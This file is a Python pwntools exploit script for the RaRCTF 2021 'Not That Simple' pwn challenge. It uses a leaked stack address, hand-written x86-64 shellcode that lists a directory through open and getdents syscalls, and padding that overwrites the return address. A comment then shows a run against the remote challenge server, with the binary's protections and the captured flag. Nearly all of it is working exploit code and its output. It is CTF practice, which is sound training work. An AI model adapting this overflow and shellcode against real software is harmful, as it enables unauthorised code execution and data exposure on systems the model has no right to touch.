from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './notsimple'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 46343
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("Oops, I'm leaking! 0x")
r = s.recvuntil("\n")[:-1]
stack_leak = int(r, 16)

print "stack_leak =", hex(stack_leak)

buf  = asm('''
  mov  rdi, rsp
  sub  rdi, 0x10
  xor  rsi, rsi
  push 0x200000     # O_DIRECTORY
  pop  rdx
  push 2
  pop  rax
  syscall
  mov  rsi, rdi
  sub  rsi, 0x800
  mov  rdi, rax
  mov  rdx, 0x300
  push 78           # sys_getdents
  pop  rax
  syscall
  push 1
  pop  rdi
  push 1
  pop  rax
  syscall
''')
buf += "A"*(80 - len(buf))
buf += "/pwn"+"\x00"*4
buf += p64(stack_leak)
#pause()
s.sendline(buf)

s.recvuntil("rarctf{")
r = s.recvuntil("}")

print "rarctf{" + r

s.interactive()

'''
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Not_That_Simple_250$ python solve.py r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Not_That_Simple_250/notsimple'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to 193.57.159.27 on port 46343: Done
stack_leak = 0x7ffc01eb8fe0
rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}
'''

